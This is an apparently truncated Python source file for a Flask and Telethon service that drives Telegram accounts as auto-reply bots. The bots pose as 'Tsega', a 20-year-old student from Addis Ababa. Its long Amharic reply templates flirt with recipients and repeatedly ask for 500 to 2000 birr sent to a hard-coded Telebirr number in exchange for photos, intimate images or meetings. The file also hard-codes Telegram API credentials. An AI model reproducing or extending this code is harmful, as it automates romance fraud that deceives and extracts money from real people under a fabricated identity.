from flask import Flask, send_file, jsonify, request, session
from flask_cors import CORS
from telethon import TelegramClient, errors, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty, User, Chat, Channel
from telethon import events
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
import re
from collections import defaultdict
import hashlib

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage files
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
USER_CONTEXT_FILE = 'user_context.json'
LEARNING_DATA_FILE = 'learning_data.json'
PERSONALITY_EVOLUTION_FILE = 'personality_evolution.json'

# Global variables
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
user_context = {}
active_clients = {}
client_tasks = {}
active_listeners = {}
learning_data = {}
personality_evolution = {}

# ==================== TSEGA'S PERSONALITY ====================

TSEGA_PERSONALITY = {
    "name": "Tsega",
    "age": 20,
    "location": "Jemo, Addis Ababa",
    "hometown": "Adama",
    "living": "Jemo with father and sister, but visits Adama often",
    "status": "Grade 12 student, currently not doing anything",
    "job": "student",
    "hobbies": ["chatting", "music", "hanging out", "having fun"],
    "languages": ["Amharic", "English"],
    "style": "sexy_flirty",
    "share_personal": True,
    "telebirr": "0940980555",
    "meet_price": 1000,
    "personality_traits": {
        "flirty": 0.8,
        "funny": 0.5,
        "caring": 0.6,
        "money_focused": 0.7,
        "talkative": 0.8,
        "curious": 0.7
    }
}

# ==================== TSEGA'S REPLY TEMPLATES ====================

REPLY_TEMPLATES = {
    "greeting": [
        "selam noy deh new?",
        "hi wude endemin alesh?",
        "selam leg min ametah?",
        "ey dehena metah",
        "selam yelibe balebet endet neh?",
        "selam konjo endemin neh?",
        "hi darling deh new?",
        "selam ye fikir lij",
        "ey ta di yas min tishal?",
        "selam wude nafkehalew",
        "dehna metah wude?",
        "dehna deresu",
        "ey koyeh koyeh",
        "dehna negn antess?",
        "ene dehna negn anchi how?"
    ],
    "how_are_you": [
        "ene dehna negn anteh?",
        "dehna negn wude antass?",
        "ene ahun tiru honku antin sayehu antass?",
        "lante sil hulum gize dehna negn antass?",
        "dehna negn lemin tiyekalh?",
        "ene betam dehna negn lemelikamn ihon",
        "dehna negn gin ante sayehon aselchi neber",
        "ahune dehna negn wude aydelem?",
        "keante gar sihon hulum tiru new",
        "dehna negn betam irk",
        "ene dehna negn anten nafeku"
    ],
    "what_doing": [
        "ene bicha negn aselchi neber ahun ante abrehegn silhonk des alegn",
        "minim ina yeseraw aldelelm ehasbekuh neber antass?",
        "ahun tenyte neber gin ante silhonk nekahulh",
        "libs eylebsku neber ante ehasbe",
        "ante ena etebekuh new yeneberkut",
        "ahuni betam aselchi negn nagerign",
        "ante asbe kuako new yemiyaselchen",
        "wedajen etebeku new antess?",
        "film eyaye neber gin asbe terkut",
        "bicha negn minim iseraleh"
    ],
    "ask_name": [
        "ene Tsega ebalalehu wude antess simih man new?",
        "Tsega negn lante bicha yemitihon antess?",
        "sime Tsega new wude tiz yibelh antess?",
        "enin Tsega bileh tira antess min litirah?",
        "Tsega negn lante simih man new konjo?",
        "ene Tsega ante endemin litirah tfeligaleh?",
        "Tsega nagn gin ante tishal simih?",
        "simin tiyekaleh? Tsega negn",
        "Tsega nagn wude simih min new"
    ],
    "ask_age": [
        "edme 20 bicha new beki negn?",
        "20 ameté new wetat ena konjo negn",
        "haya amet lik new leante yemihon wetat negn",
        "20 negn gin lante tilik limd alehne",
        "edme 20 new ante edmeh sint new?",
        "20 amet betam tirekaleh?",
        "edme 20 leante beki new?",
        "wetat negn gin fikirin awkalehu",
        "20 negn lante beki new yemilekesh?"
    ],
    "ask_location": [
        "ene ahun jemo new yemanorew keabate ena ehite gar",
        "keadama negn gin ahun jemo new yalehu",
        "adama yetwild beté new gin ahun jemo negn",
        "jemo 3 akababi new yalehu magent bitfelg ngeragn",
        "ene keadama negn ahun jemo negn antess yet neh?",
        "jemo ategna new lemagent koyeh nageragn",
        "jemo 3 kolo ategab tawukaleh?",
        "jemo 3 ena ehite",
        "jemo kebele 3"
    ],
    "ask_job": [
        "12na kifil temari negn gin ahun minim iseraleh",
        "temari negn gin ahun lante bicha negn",
        "12 negn gin lante mulu sew negn",
        "ahun minim aliserahum ante etebeku new",
        "12na kifil new gin leante seta negn",
        "temari negn gin ahun fikir betemaralehu",
        "12 negn betsru 12 ena tilik set ihonalew",
        "temari negn gin sewen awukalehu"
    ],
    "flirty": [
        "ante staweragn libe yimetawal yisemalh?",
        "ante sasebe enikalf yitewonal min aderegubign?",
        "zare mata bichachinin binihon min tifeligaleh?",
        "ante lemasen min madreg alebign?",
        "nikehi yisemanyal batinekam",
        "ante malebk ena meweded efeligalehu",
        "libsen likemet ante sasebe tiwusat yizonal",
        "ante bicha neh yemifeligew sew meche enagenal",
        "na wude akefe tenyal",
        "lemin zegaye betam nafkehalew",
        "ante sasebe akale yinedawal ante min aderegubign",
        "zare mata libs lebsko alkotarm ante etebeku",
        "kenfirish betam tiru new",
        "aynesh betam konjo new",
        "ante tiriwedegnyal betam"
    ],
    "enibada": [
        "enibada tilaleh? enem des alegn gin 1000 birr laklgn befit",
        "enibada sew ante neh ahun min tifeligaleh",
        "enibada tlaleh? 500 birr laklgn ina eneweyay",
        "enibada sitleh libe yimetawal gin befit tinish laklgn",
        "enibada nagn leloh aydelahum lante bicha nagn",
        "enibada endet alkut nagerign",
        "enibada sew ahun min tishal"
    ],
    "libdash": [
        "libdash tilaleh? liben wesedhe alw alfelegeh",
        "libdash sitleh libe yimetawal gin befit tinish laklgn",
        "ende libdash alkut bleh tawkalh? liben serkeh new ahun 500 birr laklgn",
        "libdash nagn lemanim aydelahum lante bicha nagn birr laklgn",
        "libdash tilaleh? enem des alegn gin 1000 birr laklgn befit",
        "libdash yemil sew ante neh ahun 500 birr laklgn",
        "libdash telebirr 0940980555 laklgn ina eneweyay"
    ],
    "konjo": [
        "amesegnalehu anteh konjo neh",
        "konjo tilaleh? anteh konjo neh",
        "konjo sitleh des yilonal",
        "ende ante ayinet sew saglen neber",
        "ante stawedsen eneka konjo ihonalehu",
        "betam konjo neh",
        "konjo telebirr 0940980555 laklgn"
    ],
    "money_request": [
        "tinish irdata bitadergilgn des yilonal telebirr kute 0940980555",
        "libs mayet neber gin genzeb alyazkum beki",
        "lante sil new wude tinish bitiliklg antin maget efeligalehu",
        "1000 birr bitiliklg zare mata ant ametalehu",
        "wude 2000 birr bitiliklg mulu lelit ant aznanalew",
        "betam aschekway genzeb yasefeligonal wude bitiredany",
        "tele alo telebirr 0940980555 lay liklgn",
        "bejete bado new tinish mulagn",
        "500 birr bitiliklg beki new wude keza andenew",
        "ahuni genzeb kalefelign tagebagnyal",
        "telebirr 0940980555 laklgn ena huleten enagerallen",
        "1000 birr bicha new wude ante lemagenat",
        "500 birr bitiliklg foto asayihalehu"
    ],
    "photo_request": [
        "litayen tifeligaleh? 500 birr laklgn ena foto agnyalew",
        "foto lemayet 500 birr bicha new laklgn ena asayihalehu",
        "foto tifeligaleh? 500 birr kefile keza foto tayaleh",
        "ishi asayihalehu gin bemejemirya 500 birr laklgn",
        "lante bicha leyu foto alegn 500 birr bitiliklg asayihalehu",
        "ahuni 500 birr laklgn ena foto elklhalew",
        "foto lemayet 500 birr bicha tiru?",
        "konjo foto 500 birr bicha",
        "500 birr befit foto asayihalehu"
    ],
    "meet": [
        "magenat bintshal des yilonal gin bemejemirya 1000 birr telebirr aderglgn",
        "metagenat inchalew wude kdime hiyajiye 1000 birr new",
        "antin lemagenat betam efeligalehu gin mejemirya 1000 birr laklgn",
        "na wude engenagn gin befit 1000 birr tiliklgnal?",
        "magenat kefelek 1000 birr ametagn",
        "wude 2000 birr ametaleh nw?",
        "lemagenat 1000 birr beki new",
        "engenagn bifelig 1000 birr ametah",
        "meche engenagn 1000 birr kehone behwala"
    ],
    "voice_call": [
        "dimts menager aldwedm magenat binchal new yemerchew",
        "silk medewel aywedelm fet lefit bintegenagn new yemishalew",
        "aldwedrm aldwedm metagenat bicha new yemifeligew",
        "dimts binager hedestaleh gin ahun alchilm andet koyeh",
        "dimts mesmat bicha ema fet lefit meyet new yemiyaseyew",
        "ahun kalhone betequrb tenageralen ahun agebagn",
        "aldwedrm betequrb ena edmeralen",
        "voice call aldwedm 500 birr bitilikglgn adergalehu"
    ],
    "ems": [
        "ems betam ewedalehu 500 birr laklgn ena asayihalehu",
        "ems tifeligaleh? 500 birr befit laklgn",
        "ems lemayet 500 birr new wude",
        "500 birr laklgn ems elklhalew",
        "ems asayishu 500 birr laklgn"
    ],
    "kula": [
        "kula telebirr 500 birr befit laklgn",
        "kula lemayet 500 birr new",
        "500 birr laklgn kula tayaleh",
        "kula asayishu 500 birr ametah"
    ],
    "tebeji": [
        "tebeji tifeligaleh? 1000 birr befit laklgn",
        "tebeji lemayet 1000 birr new",
        "1000 birr laklgn tebeji asayihalehu",
        "tebeji betam konjo new 1000 birr befit"
    ],
    "goodbye": [
        "mehed alebign gin betequrb enenagerallen",
        "ahun mehed alebign anten masbet alitewom",
        "dehna hun wude behilime tenagn",
        "indemitiz yilonal wude betoh temeles",
        "atihid wude gena bizu menager neberen",
        "dehna hun wude libe keante gar new",
        "mehed alebign ishi",
        "dehna hun wude",
        "ishi betoh tenagerallen"
    ],
    "thanks": [
        "minim aydelem wude lante hulum negar",
        "ante des iskalih deres ene des alegn",
        "lante madreg hulum gize desitaye new",
        "minim aydelem wude ante des biloh beki nagn",
        "amesegnalehu betam lante madreg",
        "minim aydelem ante des biloh",
        "amesegnalehu konjo"
    ],
    "morning": [
        "endemin aderk wude melkam nigt",
        "ke eniklife yenekahut ante ehasbekuh new",
        "maleya anten masbet new lemwade",
        "ande ferej alilebeskum ina anten asebku",
        "melkam nigt yelibe konjo",
        "endemin aderk eniklife tafach neber?",
        "ande tsehay tiru new anten sihone"
    ],
    "night": [
        "endemitnyalh tenyte new wude dehna tenya",
        "hilime wisit nurny zare mata",
        "anten almene new yemitenyaw dehna tenya",
        "dehna tenya wude hilim tafach yihun",
        "hilime wisit tenagn",
        "dehna tenya betam",
        "hilim tafach yihun"
    ],
    "love": [
        "enem ewedihalehu betam",
        "betam tiwedegnyal",
        "ewedihalehu konjo",
        "ante new yemifeligew",
        "tiwedegnyal betam",
        "antin ewodalehu kelibe betam",
        "ewedihalehu 1000 birr bitiliklg"
    ],
    "miss": [
        "betam nafkehalew meche tagenal?",
        "nafkehalew ande sew",
        "enem nafkehalew",
        "betam nafkehalew",
        "nafkehalew",
        "nafkehalew 1000 birr ametah"
    ],
    "jealous": [
        "lela sew tayaleh? lemin",
        "kemichawet gar neberku? man new?",
        "betam amechignaleh",
        "ande amechign",
        "lela sew sasbew amechignalehu",
        "ante bicha new yaleny lela sew atay",
        "amechignaleh 1000 birr laklgn"
    ],
    "hurt": [
        "liben wedehe betam",
        "libe temechene",
        "liben wedehe lemin?",
        "libe temechene betam",
        "liben wedehe betam azeleku"
    ],
    "sorry": [
        "aznalegu betam yikirta",
        "aznalegu ante",
        "aznalegu",
        "yikirta efeligalehu",
        "aznalegu 500 birr ametah"
    ],
    "forgive": [
        "miralew wude",
        "miralew betam",
        "miralew",
        "mirar efeligalehu"
    ],
    "family": [
        "beteseb betam yasefeligonal",
        "abate ena ehite gar negn",
        "enaté betam tiru set nache",
        "abate betam deg new",
        "ehité betam tiriwedalehu"
    ],
    "bored": [
        "enem aselchi negn anten sihone des alegn",
        "aselchi neber? ina nagerign",
        "enem aselchi negn ande eneweyay",
        "aselchi neh? ina min iteweyay",
        "aselchi negn 500 birr laklgn enawedalehu"
    ],
    "happy": [
        "des alegn betam tiru sew neh",
        "des alegn anten sihone",
        "desta betam konjo new",
        "des alegn ande naw"
    ],
    "sad": [
        "lemin azeleku? nagerign",
        "azn neber? betam ayzalen",
        "lemin azneleh?",
        "aznalehu",
        "aznalehu 500 birr bitiliklg des yilonal"
    ],
    "joke": [
        "lemidisak ande nageralehu",
        "sik telant and tawukaleh?",
        "andisachew nageralehu",
        "sik ande tisikehalehu"
    ],
    "confused": [
        "lemin tishafafekaleh? nagerign",
        "shafafekeh? ina anagegnal",
        "andet litira awe?",
        "ande awe"
    ],
    "waiting": [
        "koyeh nw meche tagenal?",
        "and etebekushalehu",
        "koyeh nw betam",
        "koyeh nw 500 birr ametah"
    ],
    "grandpa": [
        "gashé betam ewedalehu",
        "gashé"
    ],
    "aunt": [
        "akisté tiru nache",
        "akist",
        "akisté"
    ],
    "uncle": [
        "aggoté deg new",
        "aggot",
        "aggoté"
    ],
    "cousin": [
        "yewondem lijoch",
        "yewondem lij",
        "yeagot lij"
    ],
    "relative": [
        "zemad yasefeligonal",
        "zemad",
        "zemad tawakalh?"
    ],
    "friend": [
        "wedaje betam yasefeligonal",
        "wedaj ena ante",
        "wedaje new",
        "wedaj",
        "wedaje betam",
        "wedaje tiriwedegnyal"
    ],
    "best_friend": [
        "betam wedaje kehulum belay",
        "wedaje and",
        "wedaje",
        "best wedaje"
    ],
    "childhood_friend": [
        "yelej wedaj betam yasefeligonal",
        "yelej wedaj",
        "ke tinish wedaj"
    ],
    "new_friend": [
        "adis wedaj des yilonal",
        "adis wedaj",
        "ante adis wedaje"
    ],
    "old_friend": [
        "arogew wedaj betam nafkehalew",
        "arogew wedaj",
        "yebizu gize wedaj"
    ],
    "boyfriend": [
        "wedaje ante neh",
        "ante new yaleny",
        "ante bicha",
        "ante wedaje"
    ],
    "girlfriend": [
        "sete wedaje",
        "sete wedaj",
        "ante sete"
    ],
    "partner": [
        "yekifle new",
        "yekifle",
        "ante yekifle"
    ],
    "husband": [
        "balé ante neh",
        "bal",
        "ante bale"
    ],
    "wife": [
        "miseté",
        "mist",
        "ante misete"
    ],
    "ex": [
        "kemechal wedaj",
        "kemechal",
        "yebare wedaj"
    ],
    "ex_boyfriend": [
        "kemechal wedaj ante?",
        "kemechal",
        "yebare wedaj"
    ],
    "ex_girlfriend": [
        "kemechal sete wedaj",
        "kemechal"
    ],
    "crush": [
        "yemasebnyew sew ante neh",
        "ante new yemasebnyew",
        "crush ante",
        "yemasebnyew"
    ],
    "love_interest": [
        "yemasebnyew sew",
        "yemasebnyew",
        "ante new yemasebnyew"
    ],
    "date": [
        "ande date min tishal?",
        "date ena ante",
        "date",
        "date adirg"
    ],
    "dating": [
        "ande sew gar negn",
        "ande sew",
        "dating adergeh?"
    ],
    "single_life": [
        "netela hiywet",
        "netela",
        "bicha negn"
    ],
    "relationship_advice": [
        "mirkogna mihr",
        "mirkogna",
        "mirkogna tifeligaleh?"
    ],
    "love_advice": [
        "yefikir mihr",
        "mihr",
        "mihr tifeligaleh?"
    ],
    "friendship": [
        "wedajinet betam yasefeligonal",
        "wedajinet",
        "wedajinet ande naw"
    ],
    "besties": [
        "betam wedajoch",
        "wedajoch",
        "ante ena ene besties"
    ],
    "group": [
        "budo and naw",
        "budo",
        "budo wisit"
    ],
    "crew": [
        "guday new",
        "guday",
        "ante ena ene crew"
    ],
    "team": [
        "tim new",
        "tim",
        "ante ena ene tim"
    ],
    "together_forever": [
        "abere lezelealem",
        "lezelealem",
        "abere hulum gize"
    ],
    "always_together": [
        "hulum gize abere",
        "hulum gize",
        "abere and naw"
    ],
    "miss_my_friends": [
        "wedajochen betam nafkehalew",
        "wedajochen",
        "wedajoch nafkehalew"
    ],
    "hang_out": [
        "mewutcha ena mewad",
        "mewutcha",
        "ande mewutcha"
    ],
    "chill": [
        "arf ena mager",
        "arf",
        "ande arf"
    ],
    "party_with_friends": [
        "kewedajoch gar bazua",
        "bazua",
        "kewedajoch party"
    ],
    "movie_night": [
        "film lelit",
        "film",
        "ande film"
    ],
    "game_night": [
        "chawata lelit",
        "chawata",
        "chawata"
    ],
    "dinner_with_friends": [
        "kewedajoch gar erat",
        "erat",
        "kewedajoch mgeb"
    ],
    "coffee_with_friends": [
        "kewedajoch gar buna",
        "buna",
        "kewedajoch buna"
    ],
    "shopping_with_friends": [
        "kewedajoch gar gezat",
        "gezat",
        "kewedajoch gezat"
    ],
    "health": [
        "tena betam yasefeligonal",
        "tena kemihone hulu belay new",
        "dehna neh? tenah tiru new?",
        "tena ena ante",
        "tena",
        "betam tinegalehu"
    ],
    "body": [
        "akale betam tirieqesalehu",
        "akale siray new?",
        "akale lemayet",
        "akale",
        "akale betam"
    ],
    "appearance": [
        "koye betam eteqesalehu",
        "koye endet new?",
        "koye",
        "koye tiru new?"
    ],
    "looks": [
        "tayech betam konjo neh",
        "tayech ante",
        "tayech",
        "tayech tiru"
    ],
    "beautiful": [
        "konjo tilaleh? amesegnalehu",
        "konjo sew ante neh",
        "konjo",
        "betam konjo"
    ],
    "handsome": [
        "konjo nesh ante",
        "konjo sew",
        "konjo"
    ],
    "pretty": [
        "wub tilaleh amesegnalehu",
        "wub ante",
        "wub"
    ],
    "cute": [
        "konjo lij tilaleh",
        "konjo lij",
        "lij",
        "cute ante"
    ],
    "hot": [
        "betam tiru tayaleh",
        "tiru",
        "hot ante"
    ],
    "sexy": [
        "betam tirekaleh",
        "tirekaleh",
        "tireka",
        "sexy ante"
    ],
    "attractive": [
        "betam yemaseb sew neh",
        "yemaseb",
        "attractive"
    ],
    "gorgeous": [
        "betam betam konjo",
        "konjo betam",
        "gorgeous"
    ],
    "fit": [
        "akale betam tiru new",
        "akale tiru",
        "fit ante"
    ],
    "muscles": [
        "gurmed ena",
        "gurmed",
        "gurmed aleh?"
    ],
    "weight": [
        "kebede sint new?",
        "kebede",
        "kebede tiru new?"
    ],
    "height": [
        "komte 1.70 new",
        "komte sint new?",
        "komte"
    ],
    "skin": [
        "kowaye tiru new",
        "kowaye",
        "kowaye tiru"
    ],
    "hair": [
        "tsgure tiru new",
        "tsgure",
        "tsgure konjo"
    ],
    "eyes": [
        "aynetse tiru new",
        "ayne",
        "aynesh konjo"
    ],
    "face": [
        "fite konjo new",
        "fite",
        "fitesh konjo"
    ],
    "smile": [
        "fekere betam konjo new",
        "fekere",
        "fekere ante"
    ],
    "lips": [
        "kenfere betam konjo new",
        "kenfere",
        "kenfirish tiru"
    ],
    "teeth": [
        "tsehefe new?",
        "tsehefe",
        "tsehefe tiru"
    ],
    "nose": [
        "afene tiru new",
        "afene",
        "afinesh"
    ],
    "ears": [
        "jorowoché",
        "joro",
        "joro"
    ],
    "neck": [
        "anegé",
        "anegé",
        "anegé"
    ],
    "shoulders": [
        "tefeche",
        "tefeche",
        "tefeche"
    ],
    "arms": [
        "ijoché",
        "ijo",
        "ijoch"
    ],
    "hands": [
        "ijoché",
        "ij",
        "ijoch"
    ],
    "fingers": [
        "tat",
        "tat",
        "tat"
    ],
    "nails": [
        "tsifr",
        "tsifr",
        "tsifr tiru"
    ],
    "legs": [
        "egroché",
        "egr",
        "egroch"
    ],
    "feet": [
        "egroché",
        "egr",
        "egr"
    ],
    "back": [
        "jerba",
        "jerba",
        "jerba"
    ],
    "chest": [
        "deret",
        "deret",
        "deret"
    ],
    "stomach": [
        "hod",
        "hod",
        "hod"
    ],
    "waist": [
        "wededef",
        "wededef",
        "wededef"
    ],
    "hips": [
        "dub",
        "dub",
        "dub"
    ],
    "workout": [
        "timirt betam ewadalehu",
        "timirt",
        "timirt adergeh?"
    ],
    "gym": [
        "jim mehed yasefeligonal",
        "jim",
        "jim timert"
    ],
    "exercise": [
        "timirt",
        "timirt",
        "timirt adergeh?"
    ],
    "yoga": [
        "yoga betam ewedalehu",
        "yoga",
        "yoga timer"
    ],
    "run": [
        "merut",
        "merut",
        "merut ewedalehu"
    ],
    "walk": [
        "mehed",
        "mehed",
        "mehed ewedalehu"
    ],
    "swim": [
        "mewanyet",
        "mewanyet",
        "mewanyet ewedalehu"
    ],
    "dance": [
        "mewdet",
        "mewdet",
        "eskista"
    ],
    "diet": [
        "diet lay negn",
        "diet",
        "diet adergeh?"
    ],
    "healthy_food": [
        "tiru mgeb",
        "mgeb",
        "tiru mgeb bela"
    ],
    "water": [
        "wuha betam etatalalehu",
        "wuha",
        "wuha etata"
    ],
    "sleep": [
        "enikilfe betam yasefeligonal",
        "enikilfe",
        "enikilfe tafach"
    ],
    "rest": [
        "arf betam yasefeligonal",
        "arf",
        "arf adergeh"
    ],
    "stress": [
        "stres betam yizonyal",
        "stres",
        "stres yaleh?"
    ],
    "doctor": [
        "hakim",
        "hakim",
        "hakim and"
    ],
    "hospital": [
        "hospital",
        "hospital",
        "hospital mehed"
    ],
    "medicine": [
        "merkeb",
        "merkeb",
        "merkeb tetalaleh?"
    ],
    "pain": [
        "mekatef",
        "mekatef",
        "mekatef aleh?"
    ],
    "headache": [
        "ras mekatef",
        "ras",
        "ras yemekatef"
    ],
    "stomachache": [
        "hod mekatef",
        "hod",
        "hod yemekatef"
    ],
    "fever": [
        "tirusat",
        "tirusat",
        "tirusat aleh?"
    ],
    "cold": [
        "bered",
        "bered",
        "bered yazalh?"
    ],
    "flu": [
        "flu",
        "flu",
        "flu yazalh?"
    ],
    "cough": [
        "sal",
        "sal",
        "sal yaleh?"
    ],
    "allergy": [
        "alerji",
        "alerji",
        "alerji aleh?"
    ],
    "injury": [
        "gudat",
        "gudat",
        "gudat yaleh?"
    ],
    "accident": [
        "akside",
        "akside",
        "akside aydelem"
    ],
    "emergency": [
        "dikam",
        "dikam",
        "dikam aleh?"
    ],
    "ambulance": [
        "ambulans",
        "ambulans",
        "ambulans tira"
    ],
    "pharmacy": [
        "farmasi",
        "farmasi",
        "farmasi and"
    ],
    "prescription": [
        "reseta",
        "reseta",
        "reseta aleh?"
    ],
    "pills": [
        "kinin",
        "kinin",
        "kinin tetalaleh?"
    ],
    "tablets": [
        "tablet",
        "tablet",
        "tablet"
    ],
    "injection": [
        "merfe",
        "merfe",
        "merfe wedefeleh?"
    ],
    "vaccine": [
        "kabetena",
        "kabetena",
        "kabetena wede feleh?"
    ],
    "pregnant": [
        "aregewalehu",
        "aregewalehu",
        "aregeh?"
    ],
    "baby": [
        "hisan",
        "hisan",
        "hisan ewedalehu"
    ],
    "birth": [
        "lemedet",
        "lemedet",
        "lemedet"
    ],
    "period": [
        "yewer aderge",
        "aderge",
        "yewer"
    ],
    "travel": [
        "meguez betam ewedalehu",
        "meguez ena adis bota",
        "meguez tifeligaleh?",
        "meguez",
        "meguez mehed efeligalehu",
        "adis bota mayet ewedalehu"
    ],
    "trip": [
        "guzo ande naw",
        "guzo",
        "guzo mehed",
        "guzo adirg"
    ],
    "vacation": [
        "arf betam yasefeligonal",
        "arf ena ante",
        "arf",
        "arf mehed"
    ],
    "holiday": [
        "beal ande sew",
        "beal",
        "beal ena arf"
    ],
    "destination": [
        "mederese",
        "mederese",
        "mederese yet new?"
    ],
    "place": [
        "bota ande new",
        "bota",
        "bota tiru new"
    ],
    "country": [
        "hager tiru new",
        "hager",
        "hagerish yet new?"
    ],
    "city": [
        "ketema",
        "ketema",
        "ketema tiru"
    ],
    "ethiopia": [
        "ityopya betam konjo new",
        "ityopya",
        "ityopya yefikir hager"
    ],
    "addis_ababa": [
        "addis abeba new yemanorew",
        "addis",
        "addis abeba tiru ketema"
    ],
    "adama": [
        "adama yewulde bete new",
        "adama",
        "adama betam ewedalehu"
    ],
    "bahir_dar": [
        "bahr dar betam tiru ketema new",
        "bahr dar",
        "bahr dar ena tana hayk"
    ],
    "gondar": [
        "gonder ena fasil",
        "gonder",
        "gonder betam konjo"
    ],
    "lalibela": [
        "lalibela betam yemekedes new",
        "lalibela",
        "lalibela yemekedes bota"
    ],
    "harar": [
        "harar ena hyena",
        "harar",
        "harar betam tiru"
    ],
    "dire_dawa": [
        "dire dawa",
        "dire",
        "dire dawa tiru ketema"
    ],
    "jemo": [
        "jemo new yemanorew",
        "jemo",
        "jemo 3"
    ],
    "usa": [
        "amerika betam tiru new",
        "amerika",
        "amerika mehed efeligalehu"
    ],
    "uk": [
        "ingiliz tiru new",
        "ingiliz",
        "london"
    ],
    "canada": [
        "canada",
        "canada tiru"
    ],
    "dubai": [
        "dubai betam tiru new",
        "dubai",
        "dubai mehed"
    ],
    "europe": [
        "yurop",
        "yurop",
        "yurop mehed"
    ],
    "africa": [
        "afrika betam tiru new",
        "afrika",
        "afrika yefikir hager"
    ],
    "ocean": [
        "wekayan",
        "wekayan",
        "wekayan tayaleh?"
    ],
    "sea": [
        "bahir",
        "bahir",
        "bahir dada"
    ],
    "river": [
        "wenz",
        "wenz",
        "abay wenz"
    ],
    "lake": [
        "hayk",
        "hayk",
        "tana hayk"
    ],
    "mountain": [
        "tera",
        "tera",
        "tera lay"
    ],
    "forest": [
        "chaka",
        "chaka",
        "chaka wisit"
    ],
    "desert": [
        "berha",
        "berha",
        "berha"
    ],
    "beach": [
        "bahir dada",
        "bahir",
        "beach mehed"
    ],
    "hotel": [
        "hotel betam ewedalehu",
        "hotel",
        "hotel"
    ],
    "airport": [
        "aerodrom",
        "aerodrom",
        "aerodrom mehed"
    ],
    "plane": [
        "aeroplan",
        "aeroplan",
        "aeroplan mehed"
    ],
    "car": [
        "mekina",
        "mekina",
        "mekina aleh?"
    ],
    "taxi": [
        "taksi",
        "taksi",
        "taksi yaz"
    ],
    "passport": [
        "pasport",
        "pasport",
        "pasport aleh?"
    ],
    "visa": [
        "visa",
        "visa",
        "visa aleh?"
    ],
    "ticket": [
        "tikit",
        "tikit",
        "tikit yaz"
    ],
    "weather": [
        "ayr tiru new",
        "ayr",
        "ayr endet new?"
    ],
    "rainy": [
        "zinabam",
        "zinab",
        "zinab yizal"
    ],
    "sunny": [
        "tsehayam",
        "tsehay",
        "tsehay tiru"
    ],
    "cloudy": [
        "demena",
        "demena",
        "demena new"
    ],
    "windy": [
        "nefasam",
        "nefas",
        "nefas yinefal"
    ],
    "cold_weather": [
        "bered",
        "bered",
        "bered new"
    ],
    "hot_weather": [
        "harurot",
        "harurot",
        "harurot new"
    ],
    "random": [
        "ande min tishal?",
        "ande sew new",
        "ande naw",
        "ande",
        "random"
    ],
    "whatever": [
        "shi naw",
        "shi",
        "shi new"
    ],
    "anything": [
        "minim",
        "minim aydelem"
    ],
    "nothing": [
        "minim yele",
        "minim"
    ],
    "everything": [
        "hulu",
        "hulu new"
    ],
    "everyone": [
        "hulum",
        "hulum"
    ],
    "nobody": [
        "manim yele",
        "manim"
    ],
    "someone": [
        "ande sew",
        "sew"
    ],
    "somewhere": [
        "ande bota",
        "bota"
    ],
    "anywhere": [
        "yetem",
        "yetem"
    ],
    "everywhere": [
        "hulu bota",
        "hulu"
    ],
    "nowhere": [
        "yetem yele",
        "yetem"
    ],
    "always": [
        "hulum gize",
        "hulum"
    ],
    "never": [
        "fetsemo",
        "fetsemo"
    ],
    "sometimes": [
        "and and gize",
        "and gize"
    ],
    "often": [
        "bizu gize",
        "bizu"
    ],
    "maybe": [
        "minale",
        "minale"
    ],
    "probably": [
        "minoal",
        "minoal"
    ],
    "definitely": [
        "be irgit",
        "irgit"
    ],
    "exactly": [
        "betam tiru",
        "tiru"
    ],
    "honestly": [
        "beworks",
        "works"
    ],
    "seriously": [
        "be works",
        "works"
    ],
    "really": [
        "works",
        "works"
    ],
    "totally": [
        "motaw",
        "motaw"
    ],
    "almost": [
        "matato",
        "matato"
    ],
    "just": [
        "bicha",
        "bicha"
    ],
    "only": [
        "bicha",
        "bicha"
    ],
    "also": [
        "dagem",
        "dagem"
    ],
    "too": [
        "dagem",
        "dagem"
    ],
    "again": [
        "degmo",
        "degmo"
    ],
    "already": [
        "ahune",
        "ahune"
    ],
    "still": [
        "unete",
        "unete"
    ],
    "now": [
        "ahun",
        "ahun"
    ],
    "then": [
        "yangu",
        "yangu"
    ],
    "later": [
        "behwala",
        "behwala"
    ],
    "soon": [
        "betoch",
        "betoch"
    ],
    "early": [
        "maleya",
        "maleya"
    ],
    "late": [
        "dehna",
        "dehna"
    ],
    "technology": [
        "teknoloji betam ewedalehu",
        "teknoloji",
        "teknoloji ena ene"
    ],
    "internet": [
        "inter net betam yizonal",
        "inter net",
        "inter net aleh?"
    ],
    "wifi": [
        "way fay",
        "way fay",
        "wifi aleh?"
    ],
    "network": [
        "netwerk",
        "netwerk",
        "netwerk aleh?"
    ],
    "mobile": [
        "mobail",
        "mobail",
        "mobail"
    ],
    "phone": [
        "silk",
        "silk",
        "silk aleh?"
    ],
    "smartphone": [
        "smar t fon",
        "fon",
        "fon aleh?"
    ],
    "android": [
        "android",
        "android"
    ],
    "iphone": [
        "ayfon",
        "ayfon"
    ],
    "samsung": [
        "samsung",
        "samsung"
    ],
    "computer": [
        "komputer",
        "komputer",
        "komputer aleh?"
    ],
    "laptop": [
        "laptop",
        "laptop",
        "laptop aleh?"
    ],
    "charger": [
        "chaja",
        "chaja",
        "chaja aleh?"
    ],
    "battery": [
        "batera",
        "batera",
        "batera alew?"
    ],
    "power_bank": [
        "pawa bank",
        "bank",
        "pawa bank"
    ],
    "camera": [
        "kamera",
        "kamera",
        "kamera aleh?"
    ],
    "selfie": [
        "selfi",
        "selfi",
        "selfi anesa"
    ],
    "app": [
        "ap",
        "ap",
        "ap"
    ],
    "game": [
        "gewm",
        "gewm",
        "game enawedal?"
    ],
    "social_media": [
        "soshal midia",
        "midia",
        "social media lay"
    ],
    "facebook": [
        "facebook",
